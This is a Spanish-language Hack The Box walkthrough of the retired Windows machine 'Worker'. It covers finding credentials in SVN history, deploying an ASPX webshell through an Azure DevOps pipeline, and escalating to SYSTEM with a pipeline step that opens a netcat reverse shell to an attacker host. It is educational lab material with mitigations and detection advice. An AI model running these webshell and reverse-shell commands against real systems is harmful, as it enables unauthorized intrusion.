---
machine: Worker
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, svn, azure-devops, pipeline, webshell, winrm, privilege-escalation]
---

# Worker — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un repositorio SVN antiguo conserva en su historial un script de despliegue con credenciales de `nathen`. Esas credenciales abren una instancia de Azure DevOps con varios repos y pipelines. Se sube un webshell ASPX a un repositorio y se ejecuta el pipeline para desplegarlo, obteniendo una shell como `iis`. El disco `W:` contiene credenciales de `robisl`, que puede crear pipelines y ejecutarlos en un agente como SYSTEM.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sC -sV -p80,3690,5985 <IP>
```

- IIS en 80.
- SVN en 3690.
- WinRM en 5985.
- El dominio es `worker.htb`.

## Enumeración

```bash
svn checkout svn://<IP> worker-svn
svn log worker-svn
svn up -r2 worker-svn
```

La revisión 2 añade `deploy.ps1`, que contiene el usuario `nathen` y la contraseña `<NATHEN_PASSWORD>`. Las revisiones posteriores eliminan el secreto, pero el historial lo conserva.

La enumeración de vhosts descubre `devops.worker.htb`, `dimension.worker.htb`, `solid-state.worker.htb` y `spectral.worker.htb`.

```bash
ffuf -u http://worker.htb -H 'Host: FUZZ.worker.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0
```

## Foothold

`devops.worker.htb` usa autenticación NTLM. Con `nathen` se accede a Azure DevOps y se ven los repositorios y pipelines del proyecto SmartHotel360.

El pipeline copia el contenido del repositorio a `W:\sites\<repo>.worker.htb`. Se añade un archivo `.aspx` con una webshell al repositorio y se encola el pipeline; el archivo queda publicado y se ejecuta como `iis`.

```aspx
<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c whoami").StandardOutput.ReadToEnd()); %>
```

Se sube `nc64.exe` y se lanza una reverse shell. `whoami` confirma `iis`.

## Movimiento lateral

`W:` contiene `svnrepos`, `agents`, `AzureDevOpsData` y `sites`. En `W:\svnrepos` está la contraseña de `robisl`, `<ROBISL_PASSWORD>`, que también funciona por WinRM.

```bash
evil-winrm -i <IP> -u robisl -p '<ROBISL_PASSWORD>'
```

`robisl` pertenece a un grupo con permiso para definir builds. Se lee `user.txt`.

## Escalada de privilegios

En Azure DevOps se crea un pipeline nuevo con un agente del pool `Setup`. Ese pool se ejecuta como SYSTEM. El pipeline solo necesita lanzar una reverse shell:

```yaml
trigger:
  - master
pool: 'Setup'
steps:
  - script: C:\ProgramData\nc.exe -e cmd <LHOST> 443
    displayName: shell
```

Al ejecutarlo, la shell llega como `NT AUTHORITY\SYSTEM`; se lee `root.txt`.

## Evidencia

- `svn log` y `deploy.ps1` con la contraseña redactada.
- Captura de Azure DevOps y del pipeline.
- `whoami` como `iis`, `robisl` y SYSTEM.
- Flag redactada.

## Lecciones aprendidas

- El historial de SVN conserva secretos aunque se borren en la revisión actual.
- Un pipeline que despliega cualquier archivo del repositorio es una vía de ejecución.
- Los agentes de build pueden tener más privilegios que el usuario que encola el trabajo.

## Mitigaciones y detección

- Rotar credenciales expuestas en historiales de SVN/Git y limitar la lectura del repositorio.
- Revisar que los pipelines no publiquen archivos ejecutables arbitrarios.
- Ejecutar agentes con cuentas de servicio de bajo privilegio y aislar el pool.
- Alertar de creación de pipelines, despliegues de `.aspx` y procesos hijos de agentes.

## Referencias

- <https://www.hackthebox.com/machines/Worker>
- <https://learn.microsoft.com/en-us/azure/devops/pipelines/security/overview>
- <https://attack.mitre.org/techniques/T1552/001/>
- <https://attack.mitre.org/techniques/T1072/>
